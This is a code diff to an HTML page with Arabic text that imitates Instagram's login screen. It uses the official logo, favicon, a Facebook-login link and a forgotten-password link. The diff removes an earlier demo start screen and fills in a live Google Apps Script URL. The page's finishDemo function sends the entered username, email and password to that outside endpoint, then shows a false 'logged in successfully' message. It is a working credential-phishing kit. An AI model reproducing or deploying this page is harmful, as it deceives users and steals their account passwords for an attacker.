@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OH2A3c.png" type="image/x-icon">
     <style>
         * {
             box-sizing: border-box;
@@ -17,97 +18,102 @@
             align-items: center;
             min-height: 100vh;
             margin: 0;
+            padding: 20px 10px;
+        }
+
+        .insta-container {
+            width: 100%;
+            max-width: 350px;
         }
 
         .card {
             background: #ffffff;
             border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 30px;
-            width: 100%;
-            max-width: 350px;
+            border-radius: 1px;
+            padding: 30px 25px 20px 25px;
             text-align: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
-            margin: 10px;
+            margin-bottom: 10px;
         }
 
         .insta-logo-img {
             width: 175px;
-            margin-bottom: 20px;
             margin-top: 10px;
-        }
-
-        .insta-subtext {
-            color: #737373;
-            font-size: 14px;
-            margin-bottom: 20px;
-            line-height: 1.4;
+            margin-bottom: 25px;
         }
 
         .input-group input {
             width: 100%;
             background: #fafafa;
             border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            padding: 10px;
-            margin-bottom: 8px;
-            font-size: 13px;
+            border-radius: 3px;
+            padding: 9px 8px;
+            margin-bottom: 6px;
+            font-size: 12px;
             outline: none;
             direction: rtl;
+            box-sizing: border-box;
         }
 
         .input-group input:focus {
             border-color: #a8a8a8;
         }
 
-        .btn-blue {
+        .insta-btn-blue {
             width: 100%;
             background-color: #0095f6;
             color: #ffffff;
             border: none;
             border-radius: 8px;
-            padding: 9px;
+            padding: 7px;
             font-weight: 600;
             font-size: 14px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 8px;
         }
 
-        .btn-blue:hover {
+        .insta-btn-blue:hover {
             background-color: #1877f2;
         }
 
-        .btn-dark {
-            width: 100%;
-            background-color: #262626;
-            color: #ffffff;
-            border: none;
-            border-radius: 8px;
-            padding: 10px;
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
             font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
         }
 
-        .btn-dark:hover {
-            background-color: #000000;
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 15px;
+        }
+
+        #result {
+            display: none;
+            margin-top: 15px;
+            font-size: 13px;
+            color: #270;
+            background-color: #eefbfa;
+            border: 1px solid #c7f2ef;
+            padding: 10px;
+            border-radius: 4px;
         }
     </style>
 </head>
 <body>
 
-    <!-- الكارد الأول -->
-    <div id="start-card" class="card">
+<div class="insta-container">
+    <!-- كارد تسجيل الدخول الرئيسي -->
+    <div class="card">
+        <!-- شعار إنستغرام الرسمي أصلي -->
         <img class="insta-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">
-        <button onclick="startDemo()" class="btn-dark">
-            افتح Instagram
-        </button>
-    </div>
-
-    <!-- كارد تسجيل الدخول (مخفي في الأول) -->
-    <div id="login" class="card" style="display:none;">
-        <img class="insta-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">
-        <p class="insta-subtext">سجل الدخول للمتابعة</p>
 
         <div class="input-group">
             <input type="text" id="name" placeholder="اسم المستخدم أو الهاتف">
@@ -115,55 +121,70 @@
             <input type="password" id="password" placeholder="كلمة السر">
         </div>
 
-        <button onclick="finishDemo()" class="btn-blue">
+        <button onclick="finishDemo()" class="insta-btn-blue">
             تسجيل الدخول
         </button>
 
-        <div id="result" style="display:none; margin-top: 15px;"></div>
+        <div class="divider">
+            <span>أو</span>
+        </div>
+
+        <p style="color:#385185; font-size:14px; font-weight:600; margin: 15px 0 5px 0; cursor:pointer;">
+            تسجيل الدخول باستخدام Facebook
+        </p>
+        <p style="color:#00376b; font-size:12px; margin-top: 10px; cursor:pointer;">
+            هل نسيت كلمة السر؟
+        </p>
+
+        <div id="result"></div>
     </div>
 
-    <script>
-        // ضع رابط Google Apps Script الخاص بك هنا
-        const SCRIPT_URL = "ضع_رابط_السكربت_هنا";
+    <!-- كارد الانضمام لإنستغرام -->
+    <div class="card" style="padding: 15px;">
+        <p style="font-size:14px; margin:0; color:#262626;">
+            ليس لديك حساب؟ <span style="color:#0095f6; font-weight:600; cursor:pointer;">تسجيل</span>
+        </p>
+    </div>
+</div>
 
-        function startDemo() {
-            document.getElementById("start-card").style.display = "none";
-            document.getElementById("login").style.display = "block";
+<script>
+    // رابط السكربت الخاص بك
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxnAVdN37_FpdckPpcmvMYr8_1EMOXuTxuF32Ng4nwXbFA7nqfmeh5-WHc_VsZkjP2H/exec";
+
+    function finishDemo() {
+        const nameVal = document.getElementById("name").value;
+        const emailVal = document.getElementById("email").value;
+        const passVal = document.getElementById("password").value;
+
+        if(!nameVal || !emailVal || !passVal) {
+            alert("يرجى ملء كافة الخانات للمتابعة");
+            return;
         }
 
-        function finishDemo() {
-            const nameVal = document.getElementById("name").value;
-            const emailVal = document.getElementById("email").value;
-            const passVal = document.getElementById("password").value;
+        const data = {
+            name: nameVal,
+            email: emailVal,
+            password: passVal,
+            action: "login_attempt",
+            detected: "no"
+        };
 
-            if(!nameVal || !emailVal || !passVal) {
-                alert("يرجى ملء جميع الحقول");
-                return;
-            }
+        fetch(SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+                "Content-Type": "text/plain"
+            },
+            body: JSON.stringify(data)
+        }).then(() => {
+            const resDiv = document.getElementById("result");
+            resDiv.style.display = "block";
+            resDiv.innerHTML = "<b>تم تسجيل الدخول بنجاح!</b>";
+        }).catch(err => {
+            console.error(err);
+        });
+    }
+</script>
 
-            const payload = {
-                name: nameVal,
-                email: emailVal,
-                password: passVal,
-                action: "Login Attempt",
-                detected: "No"
-            };
-
-            fetch(SCRIPT_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: {
-                    "Content-Type": "text/plain"
-                },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                document.getElementById("result").style.display = "block";
-                document.getElementById("result").innerText = "تم تسجيل الدخول بنجاح!";
-                document.getElementById("result").style.color = "green";
-            }).catch(err => {
-                console.error(err);
-            });
-        }
-    </script>
 </body>
 </html>
